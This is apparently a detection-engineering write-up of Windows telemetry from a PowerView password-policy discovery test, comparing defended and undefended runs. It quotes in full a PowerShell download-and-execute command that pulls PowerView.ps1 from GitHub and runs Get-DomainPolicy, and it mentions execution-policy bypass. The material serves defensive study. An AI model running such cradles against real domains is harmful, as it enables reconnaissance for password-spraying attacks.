# T1201-9: Password Policy Discovery — Get-DomainPolicy with PowerView

## Technique Context

T1201 (Password Policy Discovery) covers adversary attempts to enumerate password complexity rules, lockout thresholds, and minimum length requirements. With this information, attackers calibrate password-spraying campaigns to stay below lockout thresholds, prioritize weaker credential attacks, and understand the security posture of the environment. PowerView's `Get-DomainPolicy` is a post-exploitation capability from the PowerSploit framework that queries Active Directory via LDAP to retrieve domain-wide and system access policies. It is routinely used during internal reconnaissance after initial access has been established.

Detection programs focus on PowerShell download-and-execute patterns (IEX + IWR), LDAP traffic from workstations to domain controllers, and PowerView-specific function names appearing in script block logs.

## What This Dataset Contains

This dataset captures a PowerView-based password policy discovery attempt in an undefended environment. The key command is visible in Security EID 4688, where a child PowerShell process (PID 0x4648) is created with the command line:

`"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose}`

This is the canonical live-off-the-internet IEX/IWR pattern: PowerView is downloaded directly into memory from GitHub without writing to disk, then executed. The Security channel records 7 events: 5 EID 4688 (process creations including whoami.exe, WmiApSrv.exe, and two PowerShell instances), 1 EID 4672 (special privileges assigned — SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, and SeBackupPrivilege among others assigned to SYSTEM), and 1 EID 4624 (logon type 5 service logon).

The Sysmon channel provides 32 events across EID 7 (21 DLL loads), EID 1 (3 process creations), EID 10 (3 process access events), EID 17 (2 named pipe events), EID 11 (2 file creation events), and EID 8 (1 thread creation event). The EID 1 events capture `whoami.exe` launched by the test framework. Sysmon EID 11 records `C:\Windows\System32\LogFiles\WMI\RtBackup\EtwRTTerminal-Services-LSM-ApplicationLag-4412.etl` file creation (OS activity associated with WMI service startup triggered by the PowerShell execution context) and the PowerShell profile data write at `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive`.

The PowerShell channel records 101 events: 97 EID 4104 script blocks, 2 EID 4103 module invocation events, and 2 EID 4100 error start events. The 4103 events include `Set-ExecutionPolicy Bypass -Scope Process -Force`. In an undefended environment, if PowerView downloaded successfully, additional script block events would capture the PowerView function definitions — however, the 20 sampled EID 4104 events show only test framework boilerplate. The script blocks confirming actual execution are distributed across the full 97-event set in the underlying JSONL data file.

Compared to the defended dataset (Sysmon: 25, Security: 9, PowerShell: 41), this undefended run generates significantly more telemetry — particularly in the PowerShell channel (41 vs. 101 events), which reflects Defender's AMSI interception suppressing script block recording in the defended run.

## What This Dataset Does Not Contain

This dataset does not include LDAP query events from a domain controller. While the PowerShell command requests domain policy data from Active Directory, the actual LDAP query traffic and any corresponding DC-side logs (Security EID 4662 — object access, or directory service access events) are not part of this endpoint-focused collection. If you want the full picture of what `Get-DomainPolicy` does on the wire, you would need to correlate with DC-side logs.

No Sysmon EID 3 (network connection) events are present for the PowerView download, which may reflect timing of the Sysmon network filter configuration or the connection completing before Sysmon captured it. The DNS query EID 22 is absent as well, though the connection to GitHub would have resolved `raw.githubusercontent.com` before the download.

The specific PowerView function output — the actual domain password policy values that would have been returned — is not captured in any log source in this dataset. That information exists only in memory or in output redirected by the caller.

## Assessment

The most actionable artifact in this dataset is the Security EID 4688 command line, which exposes the complete IEX/IWR chain referencing the PowerSploit GitHub repository by name. This command line includes both the specific tool URL (`PowerView.ps1`) and the PowerView function name (`Get-DomainPolicy`), making it highly specific. The special privilege assignment (EID 4672) shows the SYSTEM context, which should be unusual for a user workstation running interactive commands.

In the defended environment, Defender terminated the process before PowerView could execute, producing an exit code of `0xC0000022` (STATUS_ACCESS_DENIED). In this undefended run, the process runs to completion, which means any downstream behavioral detections (LDAP queries, domain controller connections) would also fire in a production environment with appropriate monitoring. This makes the undefended dataset more representative of what a successful attacker would actually produce.

## Detection Opportunities Present in This Data

- **Security EID 4688**: PowerShell command line containing both `IEX` and `IWR` with a URL pointing to known offensive tooling repositories; the combination of `IEX (IWR '...' -UseBasicParsing)` is a canonical download-cradle pattern
- **Security EID 4688**: `Get-DomainPolicy` appearing as a token in the PowerShell command line argument, a high-fidelity PowerView indicator
- **Security EID 4672**: SYSTEM-level privilege assignment events associated with PowerShell spawning WMI services, indicating elevated execution context during reconnaissance
- **Security EID 4624**: Service logon (Type 5) events correlated with PowerShell activity on a workstation can indicate automated execution under SYSTEM context
- **Sysmon EID 8**: Thread creation events showing PowerShell injecting threads into other processes during the reconnaissance sequence
- **PowerShell EID 4103/4104**: The `Set-ExecutionPolicy Bypass` combined with the absence of script block logging for a process that should be executing substantial code can itself be a hunting signal — PowerShell that sets bypass policy but produces minimal script block output may indicate AMSI evasion or truncation by security tools
